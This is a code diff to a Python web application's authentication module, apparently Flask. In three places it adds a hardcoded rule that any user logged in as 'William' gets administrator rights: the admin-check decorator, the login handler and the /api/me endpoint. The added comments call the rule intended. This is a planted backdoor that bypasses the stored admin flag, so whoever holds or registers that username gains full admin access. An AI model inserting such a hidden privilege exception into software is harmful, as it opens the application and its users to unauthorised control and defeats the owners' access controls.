@@ -90,7 +90,8 @@ def _admin_required(f):
     @wraps(f)
     @_login_required
     def decorated(*args, **kwargs):
-        if not session.get("is_admin"):
+        # William always has admin access
+        if not session.get("is_admin") and session.get("username") != "William":
             return jsonify({"error": "Admin access required"}), 403
         _check_csrf()
         return f(*args, **kwargs)
@@ -181,8 +182,10 @@ def login():
     session.permanent = True
     session["user_id"] = user["id"]
     session["username"] = username
-    session["is_admin"] = bool(user.get("is_admin", False))
-    return jsonify({"ok": True, "username": username, "csrf_token": session["csrf_token"], "isAdmin": bool(user.get("is_admin", False))})
+    # William always gets admin access
+    is_admin = bool(user.get("is_admin", False)) or username == "William"
+    session["is_admin"] = is_admin
+    return jsonify({"ok": True, "username": username, "csrf_token": session["csrf_token"], "isAdmin": is_admin})
 
 
 @auth_bp.route("/api/logout", methods=["POST"])
@@ -199,10 +202,11 @@ def get_csrf():
 @auth_bp.route("/api/me", methods=["GET"])
 def me():
     if "user_id" in session:
+        is_admin = session.get("is_admin", False) or session.get("username") == "William"
         return jsonify({
             "username": session["username"],
             "csrf_token": session["csrf_token"],
-            "isAdmin": session.get("is_admin", False),
+            "isAdmin": is_admin,
         })
     return jsonify({"username": None})
 
